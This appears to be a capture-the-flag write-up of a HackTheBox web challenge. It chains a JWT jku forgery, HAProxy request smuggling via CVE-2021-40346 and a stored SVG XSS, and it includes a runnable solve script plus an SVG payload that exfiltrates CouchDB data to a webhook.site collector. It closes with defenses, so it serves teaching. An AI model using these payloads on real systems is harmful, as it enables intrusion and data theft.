---
layout: post
title: "SteamCoin"
date: 2028-02-17 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, jwt, jku, http-request-smuggling, cve-2021-40346, xss, ssrf, couchdb]
description: "A three-vulnerability web chain: forge an admin JWT by hosting your own JWKS through a file upload, smuggle past a HAProxy ACL with CVE-2021-40346, then drive a headless bot with a stored SVG XSS to read the flag out of an internal CouchDB."
---

## Overview

SteamCoin is a Medium web challenge where no single bug reaches the flag — you stack three
independent web vulnerabilities, each one unlocking the pre-condition for the next. The flag
lives in the `admin` user's record inside an internal CouchDB, reachable only by a headless
"bot" that is itself gated behind an admin-only endpoint that a reverse proxy blocks from the
outside. The path is: **forge an admin session → smuggle past the proxy ACL → have the bot
read CouchDB for you.**

## The technique

The target stacks HAProxy in front of a Node/Express app, with CouchDB and a puppeteer bot
behind it:

```
you ──HTTP──► HAProxy :8081 ──► Node/Express :1337 ──► CouchDB :5984 (admin's flag)
                    │                  │
                    │                  └── puppeteer bot (/api/test-ui, admin only)
                    └── ACL: deny /api/test-ui unless src == 127.0.0.1
```

**Bug 1 — JWT `jku` forge via file upload ([CWE-347](https://cwe.mitre.org/data/definitions/347.html)).**
The auth middleware fetches the JWT verification key from a URL *inside the token* (the `jku`
header), gated only by a prefix check:

```js
if (header.jku.lastIndexOf('http://localhost:1337/', 0) !== 0)   // "must START WITH"
    return res.status(500).send('The JWKS endpoint is not from localhost!');
```

`lastIndexOf(x, 0) === 0` is just "starts with `x`" — a prefix, not a host, and it says
nothing about *what content* is at the URL. Uploaded files are served from the same origin
(`/uploads/<md5>.<ext>`), which satisfies the prefix — so we host our **own** JWKS.

**Bug 2 — HAProxy request smuggling
([CVE-2021-40346](https://nvd.nist.gov/vuln/detail/CVE-2021-40346),
[CWE-444](https://cwe.mitre.org/data/definitions/444.html)).**
Being admin isn't enough: HAProxy blocks `/api/test-ui` for any non-localhost client. HAProxy
2.4.0 stores each HTX header **name length in 8 bits**, so a 270-byte header name overflows
it and desyncs the proxy from the backend, letting us smuggle an internal request.

**Bug 3 — Stored SVG XSS → internal read
([CWE-79](https://cwe.mitre.org/data/definitions/79.html) →
[SSRF](https://cwe.mitre.org/data/definitions/918.html)).**
An SVG served as `image/svg+xml` executes its `<script>` when the bot navigates to it. That
script reads internal CouchDB (hardcoded creds, open CORS) and exfiltrates the flag.

## Solution

**1. Forge the admin JWT.** Generate an RSA keypair, build a JWKS carrying *our* public
modulus and any `kid`, upload it as `jwks.png`, and sign `{"username":"admin"}` with our
private key, pointing `jku` at the uploaded file. One catch: the upload endpoint deletes each
user's *previous* file, so use **two accounts** — one hosts the JWKS, one hosts the XSS SVG.

**2. Smuggle past the ACL.** The header name `Content-Length0` + 255× `a` is 270 bytes;
`270 & 0xFF = 14 = len("Content-Length")`, so HAProxy re-serialises a bogus `Content-Length`
and desyncs. The real second `Content-Length` must be `len(prefix) + 1`:

```
POST / HTTP/1.1
Host: <host>
Content-Length0aaaa...(255 a's)...aaaa:      # 270-byte name wraps to "Content-Length"
Content-Length: 31                           # len("POST /api/test-ui HTTP/1.1\r\nh:") + 1

POST /api/test-ui HTTP/1.1
h:
```

A second send supplies the smuggled request's headers, carrying our forged admin cookie and
a body of `{"path":"uploads/<svg-md5>.svg","keyword":"HTB"}`.

**3. The SVG reads CouchDB and exfils.** The bot renders our uploaded SVG:

Create `xss.svg`:

```xml
<svg xmlns="http://www.w3.org/2000/svg"><script>
  var x = new XMLHttpRequest();
  x.onreadystatechange = function () {
    if (this.readyState == 4) {
      new Image().src = "https://webhook.site/<uuid>/?d=" + btoa(this.responseText);
    }
  };
  x.open("GET", "http://localhost:5984/users/admin", true);
  x.setRequestHeader("Authorization", "Basic " + btoa("admin:<redacted-couchdb-pass>"));
  x.send();
</script></svg>
```

The full chain, runnable end-to-end:

```python
#!/usr/bin/env python3
# python3 solve.py <host> <port> <webhook_uuid>
import sys, time, base64, requests
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import jwt as pyjwt
from pwn import remote, context
context.log_level = 'warn'

HOST, PORT, WH = sys.argv[1], int(sys.argv[2]), sys.argv[3]
BASE = f"http://{HOST}:{PORT}"
COUCH = "Basic " + base64.b64encode(b"admin:<redacted-couchdb-pass>").decode()

def reg_login(u):
    s = requests.Session()
    s.post(f"{BASE}/api/register", json={"username": u, "password": "pw"})
    s.post(f"{BASE}/api/login", json={"username": u, "password": "pw"})
    return s
def upload(s, c, fn):
    return s.post(f"{BASE}/api/upload",
                  files={"verificationDoc": (fn, c, "application/octet-stream")}).json()["filename"]

# our keypair + JWKS
key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
priv = key.private_bytes(serialization.Encoding.PEM,
        serialization.PrivateFormat.TraditionalOpenSSL, serialization.NoEncryption())
n = key.public_key().public_numbers().n
n_b64 = base64.b64encode(n.to_bytes((n.bit_length()+7)//8, 'big')).decode()
KID = "k1"
jwks = '{"keys":[{"alg":"RS256","kty":"RSA","use":"sig","e":"AQAB","n":"'+n_b64+'","kid":"'+KID+'"}]}'
svg = ('<svg xmlns="http://www.w3.org/2000/svg"><script>'
       'var x=new XMLHttpRequest();x.onreadystatechange=function(){if(this.readyState==4){'
       f'new Image().src="https://webhook.site/{WH}/?d="+btoa(this.responseText);}}}};'
       'x.open("GET","http://localhost:5984/users/admin",true);'
       f'x.setRequestHeader("Authorization","{COUCH}");x.send();</script></svg>')

# two users so neither uploaded file is unlinked
jwks_fn = upload(reg_login("a_"+str(int(time.time()))), jwks, "j.png")
svg_fn  = upload(reg_login("b_"+str(int(time.time()))), svg,  "x.svg")

# forge admin token pointing jku at our uploaded JWKS
jku = f"http://localhost:1337/uploads/{jwks_fn}"
tok = pyjwt.encode({"username": "admin", "iat": int(time.time())}, priv,
                   algorithm="RS256", headers={"kid": KID, "jku": jku})

# CVE-2021-40346 smuggle POST /api/test-ui past the src==127.0.0.1 ACL
body = '{"path":"uploads/%s","keyword":"HTB"}' % svg_fn
prefix = b"POST /api/test-ui HTTP/1.1\r\nh:"
req1 = (b"POST / HTTP/1.1\r\nHost: " + f"{HOST}:{PORT}".encode() + b"\r\n"
        b"Content-Length0" + b"a"*255 + b":\r\n"
        b"Content-Length: " + str(len(prefix)+1).encode() + b"\r\n\r\n" + prefix)
req2 = ("POST /api/register HTTP/1.1\r\nHost: 127.0.0.1:1337\r\n"
        f"Cookie: session={tok}\r\nContent-type: application/json\r\n"
        f"Content-length: {len(body)}\r\n\r\n" + body + "\r\n\r\n").encode()
c = remote(HOST, PORT); c.send(req1); time.sleep(1); c.send(req2); c.close()

# collect the flag from the OOB collector
import re
for _ in range(30):
    time.sleep(3)
    for e in requests.get(f"https://webhook.site/token/{WH}/requests?sorting=newest").json()["data"]:
        raw = e.get("query", {}).get("d", "")
        if raw:
            m = re.search(r'HTB\{[^}]+\}', base64.b64decode(raw+"===").decode(errors="replace"))
            if m: print("FLAG:", m.group(0)); sys.exit(0)
```

Running it drives the bot, which exfils the admin document to the collector; base64-decoding
it yields `verification_doc` — the flag, `HTB{...}`.

## Why it worked

Every layer looked reasonable in isolation but failed as a unit. The `jku` allowlist was a
**prefix** check that a same-origin file upload trivially satisfies — the signature is only as
trustworthy as the *source* of the key. HAProxy 2.4.0's 8-bit header-name-length field
overflows on a 270-byte name, so the proxy and backend disagree on message boundaries and the
localhost-only ACL is bypassed by a request the proxy never realises is there. And the
puppeteer bot is over-trusted: it can reach an internal CouchDB whose credentials are
hardcoded and whose CORS is wide open, turning a stored SVG XSS into a full internal read.

## Fix / defense

- **jku:** pin the JWKS to a fixed server-side key; never fetch a token-supplied `jku`. If a
  URL must be validated, compare the **full origin** (not a prefix) and never serve
  user-uploaded files from the trusted origin.
- **Smuggling:** patch HAProxy to ≥ 2.4.1 / 2.0.25 / 2.2.17 / 2.3.14; reject oversized or
  malformed header names; enforce access control at the backend, not only the proxy.
- **SVG XSS → SSRF:** serve uploads as `text/plain` with `Content-Disposition: attachment`,
  strip `<script>` from SVGs, network-isolate the bot from internal services, scope CouchDB's
  CORS, and never hardcode database credentials.
